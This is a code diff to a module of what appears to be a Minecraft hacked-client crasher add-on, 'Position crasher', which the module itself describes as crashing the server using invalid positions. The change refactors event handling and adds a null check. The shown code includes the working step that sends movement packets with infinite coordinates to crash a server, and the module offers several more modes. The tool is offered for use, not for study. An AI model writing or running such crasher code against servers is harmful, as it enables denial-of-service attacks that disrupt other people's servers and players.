@@ -9,9 +9,10 @@ import su.mandora.tarasande.system.base.valuesystem.impl.ValueMode
 import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
 import su.mandora.tarasande.system.feature.modulesystem.Module
 import su.mandora.tarasande.util.math.TimeUtil
+import su.mandora.tarasande_crasher.CRASHER
 import su.mandora.tarasande_crasher.forcePacket
 
-class ModulePositionCrasher : Module("Position crasher", "Crashes the server using invalid positions", "Crasher") {
+class ModulePositionCrasher : Module("Position crasher", "Crashes the server using invalid positions", CRASHER) {
 
     private val mode = ValueMode(this, "Mode", false, "Negative infinity", "Positive infinity", "Random offsets", "Force chunk loading", "Minimalistic offset")
 
@@ -28,11 +29,13 @@ class ModulePositionCrasher : Module("Position crasher", "Crashes the server usi
         registerEvent(EventDisconnect::class.java) {
             switchState()
         }
-        registerEvent(EventUpdate::class.java) {
-            if (repeat.value) {
-                if (timer.hasReached(repeatDelay.value.toLong())) {
-                    execute()
-                    timer.reset()
+        registerEvent(EventUpdate::class.java) { event ->
+            if(event.state == EventUpdate.State.PRE) {
+                if (repeat.value) {
+                    if (timer.hasReached(repeatDelay.value.toLong())) {
+                        execute()
+                        timer.reset()
+                    }
                 }
             }
         }
@@ -43,6 +46,9 @@ class ModulePositionCrasher : Module("Position crasher", "Crashes the server usi
     }
 
     private fun execute() {
+        if(mc.player == null)
+            return
+
         if (mode.isSelected(0) || mode.isSelected(1)) {
             val infinity = if (mode.isSelected(0)) Double.NEGATIVE_INFINITY else if (mode.isSelected(1)) Double.POSITIVE_INFINITY else 0.0
             forcePacket(PlayerMoveC2SPacket.PositionAndOnGround(infinity, infinity, infinity, true))
